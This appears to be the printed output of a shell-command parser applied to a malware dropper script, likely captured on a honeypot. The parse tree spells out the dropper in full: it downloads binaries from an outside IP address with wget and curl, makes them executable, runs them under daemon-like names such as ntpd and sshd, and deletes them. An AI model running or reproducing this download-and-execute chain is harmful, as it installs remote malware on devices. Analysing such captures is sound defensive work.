[WordNode(discard=False lineno=1 parts=[] pos=(0, 2) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(11, 13) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(26, 28) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(37, 39) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(49, 51) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(55, 59) word='wget')]
[WordNode(discard=False lineno=1 parts=[] pos=(89, 93) word='curl')]
[WordNode(discard=False lineno=1 parts=[] pos=(126, 131) word='chmod')]
[WordNode(discard=False lineno=1 parts=[] pos=(141, 147) word='./ntpd')]
[WordNode(discard=False lineno=1 parts=[] pos=(149, 151) word='rm')]
[WordNode(discard=False lineno=1 parts=[] pos=(0, 2) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(11, 13) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(26, 28) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(37, 39) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(49, 51) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(55, 59) word='wget')]
[WordNode(discard=False lineno=1 parts=[] pos=(89, 93) word='curl')]
[WordNode(discard=False lineno=1 parts=[] pos=(126, 131) word='chmod')]
[WordNode(discard=False lineno=1 parts=[] pos=(141, 147) word='./sshd')]
[WordNode(discard=False lineno=1 parts=[] pos=(149, 151) word='rm')]
[WordNode(discard=False lineno=1 parts=[] pos=(0, 2) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(11, 13) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(26, 28) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(37, 39) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(49, 51) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(55, 59) word='wget')]
[WordNode(discard=False lineno=1 parts=[] pos=(92, 96) word='curl')]
[WordNode(discard=False lineno=1 parts=[] pos=(132, 137) word='chmod')]
[WordNode(discard=False lineno=1 parts=[] pos=(150, 159) word='./openssh')]
[WordNode(discard=False lineno=1 parts=[] pos=(161, 163) word='rm')]
[WordNode(discard=False lineno=1 parts=[] pos=(0, 2) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(11, 13) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(26, 28) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(37, 39) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(49, 51) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(55, 59) word='wget')]
[WordNode(discard=False lineno=1 parts=[] pos=(89, 93) word='curl')]
[WordNode(discard=False lineno=1 parts=[] pos=(126, 131) word='chmod')]
[WordNode(discard=False lineno=1 parts=[] pos=(141, 147) word='./bash')]
[WordNode(discard=False lineno=1 parts=[] pos=(149, 151) word='rm')]
[WordNode(discard=False lineno=1 parts=[] pos=(0, 2) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(11, 13) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(26, 28) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(37, 39) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(49, 51) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(55, 59) word='wget')]
[WordNode(discard=False lineno=1 parts=[] pos=(89, 93) word='curl')]
[WordNode(discard=False lineno=1 parts=[] pos=(126, 131) word='chmod')]
[WordNode(discard=False lineno=1 parts=[] pos=(141, 147) word='./tftp')]
[WordNode(discard=False lineno=1 parts=[] pos=(149, 151) word='rm')]
[WordNode(discard=False lineno=1 parts=[] pos=(0, 2) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(11, 13) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(26, 28) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(37, 39) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(49, 51) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(55, 59) word='wget')]
[WordNode(discard=False lineno=1 parts=[] pos=(89, 93) word='curl')]
[WordNode(discard=False lineno=1 parts=[] pos=(126, 131) word='chmod')]
[WordNode(discard=False lineno=1 parts=[] pos=(141, 147) word='./wget')]
[WordNode(discard=False lineno=1 parts=[] pos=(149, 151) word='rm')]
[WordNode(discard=False lineno=1 parts=[] pos=(0, 2) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(11, 13) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(26, 28) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(37, 39) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(49, 51) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(55, 59) word='wget')]
[WordNode(discard=False lineno=1 parts=[] pos=(89, 93) word='curl')]
[WordNode(discard=False lineno=1 parts=[] pos=(126, 131) word='chmod')]
[WordNode(discard=False lineno=1 parts=[] pos=(141, 147) word='./cron')]
[WordNode(discard=False lineno=1 parts=[] pos=(149, 151) word='rm')]
[WordNode(discard=False lineno=1 parts=[] pos=(0, 2) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(11, 13) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(26, 28) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(37, 39) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(49, 51) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(55, 59) word='wget')]
[WordNode(discard=False lineno=1 parts=[] pos=(88, 92) word='curl')]
[WordNode(discard=False lineno=1 parts=[] pos=(124, 129) word='chmod')]
[WordNode(discard=False lineno=1 parts=[] pos=(138, 143) word='./ftp')]
[WordNode(discard=False lineno=1 parts=[] pos=(145, 147) word='rm')]
[WordNode(discard=False lineno=1 parts=[] pos=(0, 2) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(11, 13) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(26, 28) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(37, 39) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(49, 51) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(55, 59) word='wget')]
[WordNode(discard=False lineno=1 parts=[] pos=(89, 93) word='curl')]
[WordNode(discard=False lineno=1 parts=[] pos=(126, 131) word='chmod')]
[WordNode(discard=False lineno=1 parts=[] pos=(141, 147) word='./pftp')]
[WordNode(discard=False lineno=1 parts=[] pos=(149, 151) word='rm')]
[WordNode(discard=False lineno=1 parts=[] pos=(0, 2) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(11, 13) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(26, 28) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(37, 39) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(49, 51) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(55, 59) word='wget')]
[WordNode(discard=False lineno=1 parts=[] pos=(87, 91) word='curl')]
[WordNode(discard=False lineno=1 parts=[] pos=(122, 127) word='chmod')]
[WordNode(discard=False lineno=1 parts=[] pos=(135, 139) word='./sh')]
[WordNode(discard=False lineno=1 parts=[] pos=(141, 143) word='rm')]
[WordNode(discard=False lineno=1 parts=[] pos=(0, 2) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(11, 13) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(26, 28) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(37, 39) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(49, 51) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(55, 59) word='wget')]
[WordNode(discard=False lineno=1 parts=[] pos=(88, 92) word='curl')]
[WordNode(discard=False lineno=1 parts=[] pos=(124, 129) word='chmod')]
[WordNode(discard=False lineno=1 parts=[] pos=(138, 143) word='./nut')]
[WordNode(discard=False lineno=1 parts=[] pos=(145, 147) word='rm')]
[WordNode(discard=False lineno=1 parts=[] pos=(0, 2) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(11, 13) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(26, 28) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(37, 39) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(49, 51) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(55, 59) word='wget')]
[WordNode(discard=False lineno=1 parts=[] pos=(92, 96) word='curl')]
[WordNode(discard=False lineno=1 parts=[] pos=(132, 137) word='chmod')]
[WordNode(discard=False lineno=1 parts=[] pos=(150, 159) word='./apache2')]
[WordNode(discard=False lineno=1 parts=[] pos=(161, 163) word='rm')]
[WordNode(discard=False lineno=1 parts=[] pos=(0, 2) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(11, 13) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(26, 28) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(37, 39) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(49, 51) word='cd')]
[WordNode(discard=False lineno=1 parts=[] pos=(55, 59) word='wget')]
[WordNode(discard=False lineno=1 parts=[] pos=(92, 96) word='curl')]
[WordNode(discard=False lineno=1 parts=[] pos=(132, 137) word='chmod')]
[WordNode(discard=False lineno=1 parts=[] pos=(150, 159) word='./telnetd')]
[WordNode(discard=False lineno=1 parts=[] pos=(161, 163) word='rm')]
ListNode(lineno=2 parts=[CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(12, 14) word='cd'), WordNode(discard=False lineno=2 parts=[] pos=(15, 19) word='/tmp')] pos=(12, 19)), OperatorNode(lineno=2 op='||' pos=(20, 22)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(23, 25) word='cd'), WordNode(discard=False lineno=2 parts=[] pos=(26, 34) word='/var/run')] pos=(23, 34)), OperatorNode(lineno=2 op='||' pos=(35, 37)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(38, 40) word='cd'), WordNode(discard=False lineno=2 parts=[] pos=(41, 45) word='/mnt')] pos=(38, 45)), OperatorNode(lineno=2 op='||' pos=(46, 48)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(49, 51) word='cd'), WordNode(discard=False lineno=2 parts=[] pos=(52, 57) word='/root')] pos=(49, 57)), OperatorNode(lineno=2 op='||' pos=(58, 60)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(61, 63) word='cd'), WordNode(discard=False lineno=2 parts=[] pos=(64, 65) word='/')] pos=(61, 65)), OperatorNode(lineno=2 op=';' pos=(65, 66)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(67, 71) word='wget'), WordNode(discard=False lineno=2 parts=[] pos=(72, 99) word='http://165.227.106.171/ntpd')] pos=(67, 99)), OperatorNode(lineno=2 op=';' pos=(99, 100)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(101, 105) word='curl'), WordNode(discard=False lineno=2 parts=[] pos=(106, 108) word='-O'), WordNode(discard=False lineno=2 parts=[] pos=(109, 136) word='http://165.227.106.171/ntpd')] pos=(101, 136)), OperatorNode(lineno=2 op=';' pos=(136, 137)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(138, 143) word='chmod'), WordNode(discard=False lineno=2 parts=[] pos=(144, 146) word='+x'), WordNode(discard=False lineno=2 parts=[] pos=(147, 151) word='ntpd')] pos=(138, 151)), OperatorNode(lineno=2 op=';' pos=(151, 152)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(153, 159) word='./ntpd')] pos=(153, 159)), OperatorNode(lineno=2 op=';' pos=(159, 160)), CommandNode(lineno=2 parts=[WordNode(discard=False lineno=2 parts=[] pos=(161, 163) word='rm'), WordNode(discard=False lineno=2 parts=[] pos=(164, 167) word='-rf'), WordNode(discard=False lineno=2 parts=[] pos=(168, 172) word='ntpd')] pos=(161, 172))] pos=(12, 172))
